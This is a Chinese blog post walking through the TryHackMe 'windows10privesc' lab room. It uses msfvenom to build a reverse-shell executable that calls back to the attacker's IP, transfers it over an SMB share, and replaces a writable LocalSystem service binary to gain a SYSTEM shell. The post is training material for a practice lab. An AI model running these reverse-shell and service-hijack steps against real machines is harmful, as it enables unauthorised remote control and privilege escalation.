> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/kKtncDzIglpp0dmyAErwww)

点击上方蓝字关注我们

**0x00: 在线漏洞平台利用**  

=====================

本次的在线漏洞平台是 Try hack me 具体链接为 https://tryhackme.com/room/windows10privesc。可以使用平台所提供的网页 kali 版，或者是用自己 kali 连到他们内网里面都可。

攻击机: kali ip 10.4.37.12

目标机器:windows10 ip 10.10.143.152

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9Sw258Xgz6nktZicboFLpaicGDSlOKOiaicIxLQFWNmg7bBoLl2rIrVojIc6tiaJiaicML1fpq4RuzWPNEAw/640?wx_fmt=png)

首先使用 xfreerdp 进行远程连接

命令: xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.143.152

**0x01: 制作反弹 shell + 传送到目标机器**
==============================

为了控制一波我们的 windows10, 我们得先在 kali 本地制作一个反弹 shell 先。

命令:

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.4.37.12 LPORT=667 -f exe -o reverseshell.exe

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9Sw258Xgz6nktZicboFLpaicGtQ7gsYicyExakrLJS2gP1ibZJOiafTibRQINcONomTuEYPtuOQBuibEEckw/640?wx_fmt=png)

1

  

  

  

  

  

  

关于传送的到目标机器可以用 kali 自带的 smbserver

命令: sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9Sw258Xgz6nktZicboFLpaicG65lackh1avialqFq2lqwvEEpyfgCkOpia4mkia9pPnOojKia8uC3ncozkA/640?wx_fmt=png)

1

  

  

  

  

  

  

然后在我们的 windows10 的 CMD 命令行模式下输入

命令:copy \\10.4.37.12\kali\revershell.exe C:\PrivEsc\reverseshell.exe

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9Sw258Xgz6nktZicboFLpaicGflRb1njlqme4gv4OOdtez9z0xsfZrKg9EhEgacshiau4YCpa8qLW2dw/640?wx_fmt=png)

1

  

  

  

  

  

  

然后去到我们刚才存放的地方，记得提前在 kali 处打开波端口。一个点击就能获得了。

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9Sw258Xgz6nktZicboFLpaicG3O9K9f7A4SviaXLY2OSlhiaR7Nx8cAuWgH1mCfLiaeRU8mwV8DyTYh6sA/640?wx_fmt=png)

**0x03: 查找特别的服务**
=================

本次会用到两个工具 PowerUp.ps1 和另外一个 accesschk.exe

PowerUp:https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1

Accesschk.exe: https://docs.microsoft.com/zh-cn/sysinternals/downloads/accesschk

Accesschk 说明书也在同一页

1

  

  

  

  

  

  

由于该靶机已经提前帮我们准备好这两个文件了，如果是在实战中可以用上面的方法传输文件。这里先使用 PowerUp.ps1

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9Sw258Xgz6nktZicboFLpaicGwv46IlKWg4xIcK4VSWg7LiaWmYLoGXHiabq86JZpMLVLzRr66or9I4kQ/640?wx_fmt=png)

1

  

  

  

  

  

  

先进入 powershell 模式，然后用.  .\PowerUp.ps1 加载，最后用 Invoke-AllChecks 启动检测

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9Sw258Xgz6nktZicboFLpaicGEGopF3ia7w2JcXlVblbCxnxGIOib6IOcuRZU5ya50JYYMPqGraNjHiaxA/640?wx_fmt=png)

1

  

  

  

  

  

  

可以找到一个特别的服务叫 filepermsvc，同时 startName 时 LocalSystem 具有更高的权限，我们的目标就是利用它。

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9Sw258Xgz6nktZicboFLpaicGyicFFoiaibZGuNZzNyDsvLcticpgYUWI80dia8623ia28qADoKr6dHHKoQpA/640?wx_fmt=png)

1

  

  

  

  

  

  

当然在利用前建议使用 accesschk.exe 看看目前用户是否具有执行权，否则就很尴尬了。这里可以看到目前用户 user 具有 RW 权限即可读可写可更改

命令:accesschk.exe /accepteula(自动接收许可协议，记得一定加上去，否则想想会自动弹出一个是否接收许可协议，就很尴尬了)

-q= 忽略 banner

-u= 忽略错误

-v = 详细信息

-w= 只显示拥有可写权的对象

后面的路径时根据 PowerUp.ps1 所提供的

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9Sw258Xgz6nktZicboFLpaicGmjZbGia7TCsnqrsqHsfvIIJ6YNdnRLicyEh1CElPKSqxyVH4K5UaJibvA/640?wx_fmt=png)

1

  

  

  

  

  

  

那我们的机会就来了，可以把前面的反弹 shell, 复制到服务的.exe 里面去，顺便把它改名为 filepermservice.exe 然后重新启动该服务，因为具有更高的权限，理论上来讲是会反弹一个更高权限的 shell

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9Sw258Xgz6nktZicboFLpaicGFlVkpak6HBzVP7hpG3N1p2D3ICVqrrG3oiajqEw3AaicbM343dmTeN1A/640?wx_fmt=png)

1

  

  

  

  

  

  

这里由于是靶机我直接在 CMD 下执行 net start 重启命令，然后提前开启 nc 成功接收到一个更高权限的 shell。

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9Sw258Xgz6nktZicboFLpaicGn6DRGpoqAYdBDwxlpERLFvcLhaN8QLgVBVtgpvCr2CEKiaXRc3CjJnQ/640?wx_fmt=png)